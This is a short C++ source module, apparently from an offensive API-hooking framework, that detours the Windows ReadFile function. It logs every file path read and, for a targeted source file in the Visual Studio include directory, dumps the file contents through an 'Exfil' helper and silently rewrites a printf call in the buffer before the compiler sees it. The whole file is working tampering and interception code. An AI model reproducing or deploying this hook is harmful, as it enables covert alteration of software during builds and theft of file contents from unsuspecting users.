#define DTR_READFILE

#include <detourer.h>
#include <string>
#include <Windows.h>
extern auto Real_ReadFile = ReadFile;

#include <modules\wrappers\build\exfil-file.h>

BOOL WINAPI HookedReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
    const char* outfile = "readfile";
    bool ret = Real_ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

    // Get the filepath & assert it's usable
    char path[MAX_PATH];
    if (GetFinalPathNameByHandleA(hFile, path, MAX_PATH, VOLUME_NAME_DOS) > MAX_PATH)
        return ret;

    Exfil::ToFile("\n[+] Intercepted attempted read of (" + std::string(path) + ")\n", outfile);
    
    // Is this the file we're looking for?
    std::string tgtFile("\\\\?\\C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC\\14.28.29333\\include\\test.c");
    if (!tgtFile.compare(0, tgtFile.length(), path)) {
        Exfil::ToFile("\t[+] MATCH. Data:\n", outfile);

        // Modify if we can find the point of injection
        // This example finds the printf() call and replaces the string.
        char* pTgtStr = strstr((char*)lpBuffer, "printf("); // printf(
        if (pTgtStr) {
            const char* myStr = "printf(\"BadVals"; // printf("BadVals
            strncpy(pTgtStr, myStr, strlen(myStr));
        }
        
        Exfil::ToFile(lpBuffer, nNumberOfBytesToRead, outfile);
    }

    return ret;
}

static const Detourer::Module m(Real_ReadFile, HookedReadFile);